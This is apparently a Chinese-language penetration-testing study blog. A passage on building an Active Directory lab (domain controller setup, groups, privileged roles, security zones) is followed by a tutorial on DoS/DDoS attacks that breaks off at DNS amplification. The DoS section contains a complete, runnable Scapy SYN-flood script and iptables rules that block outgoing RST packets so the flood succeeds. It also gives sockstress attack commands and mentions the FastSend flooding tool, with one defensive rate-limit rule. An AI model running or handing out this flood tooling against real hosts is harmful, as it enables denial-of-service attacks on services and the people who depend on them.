alt="image-20221226163342181"></p><p>在【域控制器选项】部分,将林功能级别、域功能级别都设置为” WindowsServer2012R2”,创建域林 时,在默认情况下应选择DNS服务器,林中的第一个域控制器必须是全局目录服务器且不能是只读域控 制器(RODC)。然后,设置目录服务还原模式的密码(在开机 进入安全模式修复活动目录数据库时将使 用此密码)</p><p><img src="assets/image-20221226163402592.png" alt="image-20221226163402592"></p><p>在【DNS选项】部分会出现关于DNS的警告。不用理会该警告,保持默认设置。单击”下一步”按钮,进 入”其他选项”部分。在”NetBIOS域名”(不支持DNS域名的旧版本操作系统,例如Windows98、NT,需 要通过NetBIOs域名进行通信)部分保持默认设置。单击”下一步”按钮,进人”路径”部分,指定数据库、 日志、SYSVOL文件夹的位置,其他选项保持默认设置。单击”下一步”按钮,保持默认设置。单击”下一 步”按钮,最后单击”安装按钮。安装后,需要重新启动服务器，最后升级为域控</p><p><img src="assets/image-20221226163420752.png" alt="image-20221226163420752"></p><p>服务器重新启动后,需要使用域管理员账户( HACKE Administrator)登录。此时,在”服务器管理器”界 面中就可以看到ADDS、DNS服务了</p><p><img src="assets/image-20221226163443990.png" alt="image-20221226163443990"></p><h2 id="5、创建-Active-Directory用户"><a href="#5、创建-Active-Directory用户" class="headerlink" title="5、创建 Active Directory用户"></a>5、创建 Active Directory用户</h2><p>为 Windows Server2008R2/2003和Windows7用户创建域控制器账户。如图1-26所示,在” Active  Directory用户和计算机”界面中选择Users”目录并单击右键,使用弹出的快捷菜单添加用户。</p><p><img src="assets/image-20221226163510512.png" alt="image-20221226163510512"></p><p>创建用户</p><p><img src="assets/image-20221226163526245.png" alt="image-20221226163526245"></p><h2 id="将机器加入域"><a href="#将机器加入域" class="headerlink" title="将机器加入域"></a>将机器加入域</h2><p>将Windows server 2008 计算机添加到该域中。如图所示,设置IP地址为192.168.41.20,设置DNS 地 址为192.168.41.10,然后运行” ping hack.com”命令进行测试。</p><p><img src="assets/image-20221226163601956.png" alt="image-20221226163601956"></p><p>ping 域控</p><p><img src="assets/image-20221226163617225.png" alt="image-20221226163617225"></p><p>接下来,将主机添加到域中,将计算机名改为”PC-2008”域名改为”hack.com”。单击”确定”按钮,会弹出 要求输入拥有权限的域账户名和密码的对话框。在 本实验中,输人域管理员的账号和密码,如图所示。操作完成后,会出现需要重新启动计算 机的提示。</p><p><img src="assets/image-20221226163644494.png" alt="image-20221226163644494"></p><h1 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h1><h2 id="活动目录介绍"><a href="#活动目录介绍" class="headerlink" title="活动目录介绍"></a>活动目录介绍</h2><p>活动目录( Active Directory,AD)是指域环境中提供目录服务的组件</p><p>目录用于存储有关网络对象(例如用户、组、计算机、共享资源、打印机和联系人等)的信息。目录服 务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了 目录服务,为企 业提供了网络环境的集中式管理机制</p><p>活动目录的逻辑结构包括前面讲过的组织单元(OU)、域、域树、域森林。域树内的所有域 共享一个 活动目录,这个活动目录内的数据分散存储在各个域中,且每个域只存储该域内的数 据。</p><p><img src="assets/image-20221226163733192.png" alt="image-20221226163733192"></p><p>活动目录主要提供以下功能</p><p>账号集中管理:所有账号均存储在服务器中,以便执行命令和重置密码等。 软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件,可以让 用户自由选择需要安装的软件。 环境集中管理:统一客户端桌面、IE、TCPP协议等设置。 增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络,对资料进行统一管理。 更可靠,更短的宕机时间:例如,利用活动目录控制用户访问权限,利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠,宕机时间更短。 活动目录是微软提供的统一管理基础平台,ISA、 Exchange、SMS等都依赖这个平台</p><h2 id="组织单元介绍"><a href="#组织单元介绍" class="headerlink" title="组织单元介绍"></a>组织单元介绍</h2><p>组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容 器，可以在OU上部署组策略 </p><p>组织单元是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源。是一个容器。组织 单元还具有分层结构可用来建立域的分层结构模型，进而可使用户把网络所需的域的数量减至最小</p><p> 现在有以下的需求，一个公司，人员需求如下</p><table><thead><tr><th>部门</th><th>人数</th></tr></thead><tbody><tr><td>财务部门</td><td>20人</td></tr><tr><td>人事部门</td><td>10</td></tr><tr><td>IT部门</td><td>100</td></tr><tr><td>网络管理员</td><td>3</td></tr></tbody></table><h2 id="创建组织单元"><a href="#创建组织单元" class="headerlink" title="创建组织单元"></a>创建组织单元</h2><p><img src="assets/image-20221226163928842.png" alt="image-20221226163928842"></p><h2 id="添加人员"><a href="#添加人员" class="headerlink" title="添加人员"></a>添加人员</h2><p>在创建的组织单元里新建用户</p><img src="assets/image-20221226163953187.png" alt="image-20221226163953187" style="zoom:150%;"><p><img src="assets/image-20221226164017690.png" alt="image-20221226164017690"></p><h2 id="委派控制"><a href="#委派控制" class="headerlink" title="委派控制"></a>委派控制</h2><p>因为财务部门有20个人，不能有问题就去找网络管理员，需要委派控制权限给财务部门一个代表， 让他去执行，也就是说在财务部门找一个代表，他由相应的权限去管理财务部门的计算机和用户</p><p><img src="assets/image-20221226164056993.png" alt="image-20221226164056993"></p><h1 id="域内权限划分"><a href="#域内权限划分" class="headerlink" title="域内权限划分"></a>域内权限划分</h1><h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2><h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>组( Group)是用户账号的集合。通过向组分配权限,就可以不必向每个用户分别分配权限。例如,管理 员在日常工作中,不必为单个用户账号设置独特的访问权限,只需要将用户账放到相应的安全组中。管 理员通过配置安全组访问权限,就可以为所有加入安全组的用户账号配置同样的权限。使用安全组而 不是单个的用户账号,可以大大简化网络的维护和管理工作</p><h2 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h2><p>域本地组成员来自林中任何域中的用户账户、全局组和通用组以及本域中的域本地组，在本域范围内 可用。</p><h2 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h2><p>全局组成员来自于同一域的用户账户和全局组，在林范围内可用</p><h2 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h2><p>通用组成员来自林中任何域中的用户账户、全局组和其他的通用组，在全林范围内可用 </p><p>可以这样简单地记忆: </p><p>域本地组来自全林,作用于本域; </p><p>全局组来自本域,作用于全林; </p><p>通用组来自林,作用于全林。 </p><p>案例一： </p><p>有一个打印机连接域控，设置域本地组赋予使用打印机的权限，然后设置全局组，将人员都加入到全 局组，然后将全局组加入到域本地组就可以了 </p><p>案例二 </p><p>有三个域hack.com(在北京)，sh.hack.com(在上海)，gz.hack.com(在广州)组成林，然后北京财 务部门，需要进行结算，但是数据在北京的一台服务器上权限比较高只有北京财务人员可以使用，同 时因为北京人数不够，需要上海和广州支援，这个时候怎么办？ </p><ol><li>只需要在北京的建立一个<strong>域本地组</strong>，然后赋予域本地组权限可以访问财务的数据机器 </li><li>在上海和广州分别建立<strong>全局组</strong> </li><li>在北京的域控上将上海和广州的全局组加入进来</li></ol><h2 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h2><p>A-G-DL-P策略是指将用户账号添加到全局组中,将全局组添加到域本地组中,然后为域本地 组分配资 源权限 </p><ol><li>A表示用户账号( Account) </li><li>G表示全局组( Global Group) </li><li>U表示通用组( Universal Group) </li><li>DL表示域本地组( Domain Local Group) </li><li>P表示资源权限( Permission,许可)</li></ol><p>按照AG-DL-P策略对用户进行组织和管理是非常容易的。在AGDL-P策略形成以后,当 需要给一个用 户添加某个权限时,只要把这个用户添加到某个本地域组中就可以了。</p><h2 id="重要的域本地组"><a href="#重要的域本地组" class="headerlink" title="重要的域本地组"></a>重要的域本地组</h2><p>管理员组( Administrators)的成员可以不受限制地存取计算机/域的资源。它不仅是最具权 力的一 个组,也是在活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更 改 Enterprise  Admins、 Schema admins和 Domain admins组的成员关系,是域森林中强大的 服务管理组 </p><p>远程登录组( Remote Desktop Users)的成员具有远程登录权限。 </p><p>打印机操作员组( Print Operators)的成员可以管理网络打印机,包括建立、管理及删除网 络打印机, 并可以在本地登录和关闭域控制器。 </p><p>账号操作员组( Account Operators)的成员可以创建和管理该域中的用户和组并为其设置权 限,也 可以在本地登录域控制器,但是,不能更改属于 Administrators或 Domain admins组 的账户,也不能 修改这些组。在默认情况下,该组中没有成员。</p><p>服务器操作员组( Server Operators)的成员可以管理域服务器,其权限包括建立管理删除 任意服务 器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘 锁定服务器、变更服 务器的系统时间、关闭域控制器等。在默认情况下,该组中没有成员。</p><p>备份操作员组( Backup Operators)的成员可以在域控制器中执行备份和还原操作,并可以 在本地登 录和关闭域控制器。在默认情况下,该组中没有成员 </p><p>再介绍几个重要的全局组、通用组的权限。 </p><p>域管理员组( Domain Admins)的成员在所有加入域的服务器(工作站)、域控制器和活动 目录中均 默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中,因此可以继 承 Administrators组的所有权限。同时,该组默认会被添加到每台域成员 计算机的本地  Administrators组中,这样, Domain admins组就获得了域中所有计算机的所 有权。如果希望某用户 成为域系统管理员,建议将该用户添加到 Domain admins组中,而 不要直接将该用户添加到  Administrators组中。</p><p>企业系统管理员组( Enterprise Admins)是域森林根域中的一个组。该组在域森林中的每个 域内都 是 Administrators组的成员,因此对所有域控制器都有完全访问权。</p><p>架构管理员组( Schema admins)是域森林根域中的一个组,可以修改活动目录和域森林的 模式。该 组是为活动目录和域控制器提供完整权限的域用户组,因此,该组成员的资格是 非常重要的。</p><p>域用户组( Domain users)中是所有的域成员。在默认情况下,任何由我们建立的用户账号 都属于  Domain Users组,而任何由我们建立的计算机账号都属于 Domain Computers组。因 此,如果想让 所有的账号都获得某种资源存取权限,可以将该权限指定给域用户组,或者 让域用户组属于具有该权限 的组。域用户组默认是内置域 Users组的成员。</p><h1 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h1><h2 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h2><p>划分安全域的目的是将一组<strong>安全等级相同</strong>的计算机划入同一个网段。这个网段内的计算机拥 有相同 的网络边界,并在网络边界上通过<strong>部署防火墙</strong>来实现对其他安全域的网络访问控制策略 ，从而对允许 哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。这些 措施,将使得网络风险最小化, 当攻击发生时,可以尽可能地将威胁隔离,从而降低对域内计算 机的影响。</p><p><img src="assets/image-20221226164619604.png" alt="image-20221226164619604"></p><p>在一个用路由器连接的内网中,可以将网络划分为三个区域: </p><ul><li><p>安全级别最高的内网; </p></li><li><p>安全级别中等的DMZ; </p></li><li><p>安全级别最低的外网</p></li></ul><p>在配置一个拥有DMZ的网络时,通常需要定义如下访问控制策略,以实现其屏障功能。</p><blockquote><p>内网可以访问外网:内网用户需要自由地访问外网。在这一策略中,防火墙需要执行NAT。 </p><p>内网可以访问DMZ:此策略使内网用户可以使用或者管理DMZ中的服务器 </p><p>外网不能访问内网:这是防火墙的基本策略。内网中存储的是公司内部数据,显然,这些数据一般是不允许外网用户访问的(如果要访问,就要通过VPN的方式来进行) </p><p>外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务,所以外网必须可以访问DMZ。同时,需要由防火墙来完成从对外地址到服务器实际地址的转换。</p><p> DMZ不能访问内网:如果不执行此策略,当攻击者攻陷DMZ时,内网将无法受到保护</p><p> DMZ不能访问外网:此策略也有例外。例如,在DMZ中放置了邮件服务器,就要允许访问外网,否则邮件服务器无法正常工作</p></blockquote><p>办公区:公司员工日常的工作区,一般会安装防病毒软件、主机入侵检测产品等。办公区一般能够访问 DMZ。如果运维人员也在办公区,那么部分主机也能访问核心数据区(很多企业还会使用堡垒机来统一 管理用户的登录行为)攻击者如果想进入内网,一艘会使用鱼叉攻击、水坑攻击,当然还有社会工程学手 段。办公区人员多而杂,变动也很频繁,在安全管理上可能存在诸多漏洞,是攻击者进人内网的重要途径 之 </p><p>核心区:存储企业最重要的数据、文档等信息资产,通过日志记录、安全审计等安全措施进行严密的保 护,往往只有很少的主机能够访问。从外部是绝难直接访问核心区的。一般来说,能够直接访问核心区 的只有运维人员或者IT部门的主管,所以,攻击者会重点关注这些用户的信息(攻击者在内网中进行横向 移动攻击时,会优先查找这些主机)</p><h1 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h1><h2 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h2><p>域中计算机的分类在域结构的网络中,计算机的身份是不平等的,有域控制器、成员服务器、客户机、 独立服务 器四种类型。 </p><h2 id="1、域控制器"><a href="#1、域控制器" class="headerlink" title="1、域控制器"></a>1、域控制器</h2><p>域控制器用于管理所有的网络访问,包括登录服务器、访问共享目录和资源。域控制器中存 储了域内所有的账户和策略信息,包括安全策略、用户身份验证信息和账户信息。 </p><p>在网络中,可以有多台计算机被配置为域控制器,以分拒用广的登录、访问等操作。多个域控制器可以一起工作,自动备份用户账尸和活动目录数据。这样,即使部分域控制器痪,网络访问也不会受到影响,提高了网络的安全性和稳定性 </p><h2 id="2、成员服务器"><a href="#2、成员服务器" class="headerlink" title="2、成员服务器"></a>2、成员服务器</h2><p>成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机,其主要任务是提供网络资源。成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等 </p><h2 id="3、客户机"><a href="#3、客户机" class="headerlink" title="3、客户机"></a>3、客户机</h2><p>域中的计算机可以是安装了其他操作系统的计算机,用户利用这些计算机和域中的账户就可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后,即可访间网络中的各种资源。 </p><h2 id="4、独立服务器"><a href="#4、独立服务器" class="headerlink" title="4、独立服务器"></a>4、独立服务器</h2><p>独立服务器和域没有关系。如果服务器既不加入域,也不安装活动目录,就称其为独立服务器。独立服务器可以创建工作组、与网络屮的其他计算机共享资源,但不能使用活动目录提供的任何服务 </p><p>域控制器用于冇放活动目录数据库,是域屮必须要有的,而其他三种计算机则不是必须要有的，也就是说,最简单的域可以只</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/28ddos/ddos/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/28ddos/ddos/</url>
      
        <content type="html"><![CDATA[<p>#拒绝服务与分布式拒绝服务-DOS/DDOS</p><h2 id="拒绝服务攻击概念"><a href="#拒绝服务攻击概念" class="headerlink" title="拒绝服务攻击概念"></a>拒绝服务攻击概念</h2><h3 id="概念说明"><a href="#概念说明" class="headerlink" title="概念说明"></a>概念说明</h3><h4 id="DoS拒绝服务攻击概念介绍"><a href="#DoS拒绝服务攻击概念介绍" class="headerlink" title="DoS拒绝服务攻击概念介绍"></a>DoS拒绝服务攻击概念介绍</h4><p>利用程序漏洞或<strong>一对一资源耗尽</strong>的方法对服务端发起的攻击。</p><h4 id="DDoS分布式拒绝服务攻击概念介绍"><a href="#DDoS分布式拒绝服务攻击概念介绍" class="headerlink" title="DDoS分布式拒绝服务攻击概念介绍"></a>DDoS分布式拒绝服务攻击概念介绍</h4><p>一对一的攻击方式完全拼各自的资源，攻击效果比较差；</p><p><strong>多对一</strong>的攻击汇聚资源能力，重点在于量大，属于资源耗尽型。</p><h3 id="发展历史"><a href="#发展历史" class="headerlink" title="发展历史"></a>发展历史</h3><p><strong>从前：</strong></p><p>欠缺技术能力的无赖，ping死你（最难缠的无赖）</p><p> <strong>现在：</strong></p><p>最强大最危险的攻击，攻击方式众多（专业化的要求勒索）；亲身经历：电商网站被勒索、bill gates僵尸程序。贩卖和租用肉鸡已经成为黑产中重要的一部分，最终的办法就是拼资源，投资抗DDoS，或者乖乖交保护费。</p><blockquote><p>提示信息：</p><p>匿名者（anonymous）：世界最著名的黑客组织，组织结构宽松，人员来自世界各地。以DDoS攻击著称的无政府主义者-亦正亦邪，攻击恐怖组织也攻击政府宗教机构，近些年来涉足政治斗争，成员露面时均带有Guy Fawkes面具，最早的核心成员来自4chan图片社区，惯常雇佣外围黑客成员发送DDoS攻击。</p></blockquote><h3 id="分类介绍"><a href="#分类介绍" class="headerlink" title="分类介绍"></a>分类介绍</h3><h4 id="DoS网络"><a href="#DoS网络" class="headerlink" title="DoS网络"></a>DoS网络</h4><p>基于巨量的Flood耗尽目标网络<strong>带宽资源</strong>，如：ICMP Flood、UDP Flood</p><h4 id="DoS协议"><a href="#DoS协议" class="headerlink" title="DoS协议"></a>DoS协议</h4><p>攻击<strong>协议漏洞</strong>发起的拒绝服务攻击，如：syn flood、ping of death、ARP、DNS、802.11、SSL</p><h4 id="DoS应用"><a href="#DoS应用" class="headerlink" title="DoS应用"></a>DoS应用</h4><p>针对<strong>应用软件和操作系统漏洞</strong>发起的拒绝服务攻击，大量频繁访问消耗系统资源严重的应用（CC）。</p><p>通常表现为操作系统运行正常，网络流量不大，但服务停止响应，可以是一击毙命的，也可以是耗尽目标资源的。</p><p>以上分类并不严谨，不必太过于执着于此</p><p> <img src="assets/image-20221225154312338.png" alt="image-20221225154312338"></p><p>​                               </p><h2 id="拒绝服务攻击协议介绍"><a href="#拒绝服务攻击协议介绍" class="headerlink" title="拒绝服务攻击协议介绍"></a>拒绝服务攻击协议介绍</h2><h3 id="Syn-Flood"><a href="#Syn-Flood" class="headerlink" title="Syn-Flood"></a>Syn-Flood</h3><h4 id="Syn-Flood介绍"><a href="#Syn-Flood介绍" class="headerlink" title="Syn-Flood介绍"></a>Syn-Flood介绍</h4><p><strong>SYN Flood</strong> (SYN洪水) 是种典型的DoS (Denial of Service，拒绝服务) 攻击。效果就是<strong>服务器TCP连接</strong>资源耗尽，停止响应正常的TCP连接请求。</p><h4 id="Syn-Flood原理"><a href="#Syn-Flood原理" class="headerlink" title="Syn-Flood原理"></a>Syn-Flood原理</h4><p>说到原理，还得从TCP如何建立连接(Connection)讲起。</p><p>通信的双方最少得经过3次成功的信息交换才能进入连接全开状态(Full-Open)，叫<strong>建立TCP连接的3次握手</strong>(TCP three-way handshake)。</p><p>假设连接发起方是A，连接接受方是B，即B在某个端口（Port）上监听A发出的连接请求。如下图所示，左边是A，右边是B。</p><p> <img src="assets/image-20221225154328421.png" alt="image-20221225154328421"></p><p>A首先发送SYN（Synchronization）消息给B，要求B做好接收数据的准备；</p><p>B收到后反馈SYN-ACK（Synchronization-Acknowledgement） 消息给A。</p><p>这个消息的目的有两个：</p><ol><li>向A确认已做好接收数据的准备</li><li>同时要求A也做好接收数据的准备</li></ol><p>此时B已向A确认好接收状态，并等待A的确认，连接处于半开状态（Half-Open），顾名思义只开了一半；</p><p>A收到后再次发送ACK(Acknowledgement)消息给B，向B确认也做好了接收数据的准备，至此三次握手完成，“连接”就建立了，实际上只是双方都按对方的要求进入了可以接收消息的状态。</p><p>以上彼此要求对方确认的“状态”主要是双方将要使用的消息序号(SequenceNum)，TCP为保证消息按<strong>发送顺序</strong>抵达接收方的上层应用，需要用消息序号来标记消息的发送先后顺序的。</p><p>TCP是“双工”(Duplex)连接，同时支持双向通信，也就是双方同时可向对方发送消息，其中SYN和SYN-ACK消息开启了A→B的单向通信通道（B获知了A的消息序号）；SYN-ACK和ACK消息开启了B→A单向通信通道（A获知了B的消息序号）。</p><p>以上讨论的是在双方诚实可信，网络正常的理想状况下建立连接。</p><p>但实际情况是，网络可能不稳定会丢包，使握手消息不能抵达对方，也可能是对方故意不按规矩来，<strong>故意延迟或不发送握手确认消息</strong>。</p><p>假设B通过某TCP端口提供服务，B在收到A的SYN消息时，积极的反馈了SYN-ACK消息，使连接进入半开状态，因为B不确定自己发给A的SYN-ACK消息或A反馈的ACK消息是否会丢在半路，所以会给每个待完成的半开连接都设一个Timer，如果<strong>超过时间</strong>还没有收到A的ACK消息，则<strong>重新发送</strong>一次SYN-ACK消息给A，直到重试<strong>超过一定次数</strong>时才会放弃。</p><p> <img src="assets/image-20221225154341136.png" alt="image-20221225154341136"></p><p>做好人是要付出代价的，B为帮助A能顺利连接，需要分配内核资源维护半开连接，那么当B面临海量的大忽悠A时，如上图所示，SYN Flood攻击就形成了。</p><p>攻击方A可以控制肉鸡向B发送大量SYN消息但不响应ACK消息，或者干脆伪造SYN消息中的Source IP，使B反馈的SYN-ACK消息石沉大海。</p><p>导致B被大量注定不能完成的半开连接占据，直到资源耗尽，停止响应正常的连接请求。</p><h4 id="脚本实现syn-flood攻击"><a href="#脚本实现syn-flood攻击" class="headerlink" title="脚本实现syn_flood攻击"></a>脚本实现syn_flood攻击</h4><p>攻击脚本：<strong>syn_flood.py</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> _thread<span class="token keyword">import</span> random<span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage - ./syn_flood.py [Target-IP] [Port Number] [Threads]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example - ./sock_stress.py 10.0.0.5 80 20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example will perform a 20x multi-threaded SYN flood attack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"against the HTTP (port 80) service on 10.0.0.5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>lport <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>threads <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Performing SYN flood. Use Ctrl+C to stop attack."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">synflood</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">while</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span>sport<span class="token operator">=</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span><span class="token punctuation">:</span>  _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>synflood<span class="token punctuation">,</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">0</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境准备：</p><pre class="line-numbers language-none"><code class="language-none">#给予程序执行权限chmod +x syn_flood.py# 安装Scapy到Debian, Ubuntu或Linux Mint 或kaliapt-get install python3-scapy# 安装Scapy到Fedora或CentOS/RHELyum install scapy说明：在CentOS/RHEL上，你首先需要启用EPEL仓库# 防火墙需要进行配置，阻止RST包发出iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.70.3 -j DROP说明：发一个包释放一个连接，这种达不到攻击郊果。要构成攻击效果可以通过iptables限止发送RST包。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 查看脚本帮助</p><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[/home/kali]└─# python3 syn_flood.py -hUsage - ./syn_flood.py [Target-IP] [Port Number] [Threads]Example - ./sock_stress.py 10.0.0.5 80 20Example will perform a 20x multi-threaded SYN flood attackagainst the HTTP (port 80) service on 10.0.0.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击命令：</p><pre class="line-numbers language-none"><code class="language-none">python syn-flodd.py 192.168.70.12 3389 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="软件实现syn-flood攻击"><a href="#软件实现syn-flood攻击" class="headerlink" title="软件实现syn_flood攻击"></a>软件实现syn_flood攻击</h4><p>攻击软件：FastSend</p><p><strong>攻击效果抓包截图：</strong></p><p>  <img src="assets/image-20221225154502352.png" alt="image-20221225154502352"></p><p><img src="assets/image-20221225154508773.png" alt="image-20221225154508773"></p><h3 id="socktress"><a href="#socktress" class="headerlink" title="socktress"></a>socktress</h3><p>2008年有Jack C.Louis发现，针对TCP服务的拒绝服务攻击：</p><ul><li>消耗被攻击目标系统资源，与攻击目标建立大量socket链接</li><li>完成三次握手<strong>最后的ACK包window大小为0</strong>（客户端不接收数据），攻击者资源消耗小（CPU 内存 带宽）</li><li>异步攻击，单机可拒绝服务高配资源服务器</li><li>window窗，实现的TCP流控</li></ul><h4 id="脚本实现socktress攻击"><a href="#脚本实现socktress攻击" class="headerlink" title="脚本实现socktress攻击"></a>脚本实现socktress攻击</h4><p>攻击脚本：socktress</p><p>环境准备：</p><pre class="line-numbers language-none"><code class="language-none"># 防火墙需要进行配置，阻止RST包发出iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.70.12 -j DROP说明：发一个包释放一个连接，这种达不到攻击郊果。要构成攻击效果可以通过iptables限止发送RST包。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击命令：HTTP协议访问 </p><pre class="line-numbers language-none"><code class="language-none"># C攻击脚本./sockstress 192.168.70.12:80 eth0./sockstress 192.168.70.12:80 eth0 -d 100000./sockstress 192.168.70.12:80 eth0 -p payloads/http说明：-d是微秒内指定，默认为1000000 改成10之后并发带度更快<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="攻击效果抓包截图"><a href="#攻击效果抓包截图" class="headerlink" title="攻击效果抓包截图"></a>攻击效果抓包截图</h4><p> <img src="assets/image-20221225154539039.png" alt="image-20221225154539039"></p><h4 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h4><p>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式，由于建立完整的TCP三步握手，因此使用syn cookie防御无效，</p><ul><li>根本的防御方法是采用<strong>白名单</strong>（不实际）</li><li>折中对策：<strong>限制单位时间内</strong>每IP建的TCP连接数</li><li><strong>封杀</strong>每30秒与80端口建立连接超过10个的IP地址</li></ul><pre class="line-numbers language-none"><code class="language-none">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DNS方法攻击"><a href="#DNS方法攻击" class="headerlink" title="DNS方法攻击"></a>DNS方法攻击</h3><h4 id="产生大流量的攻击方法-DDos"><a href="#产生大流量的攻击方法-DDos" class="headerlink" title="产生大流量的攻击方法 DDos"></a>产生大流量的攻击方法 DDos</h4><ul><li>单机的带宽优势 </li><li>巨大单机数量形成的流量汇聚</li><li>利用协议特性实现放大效果的流量</li></ul><h4 id="DNS协议放大效果"><a href="#DNS协议放大效果" class="headerlink" 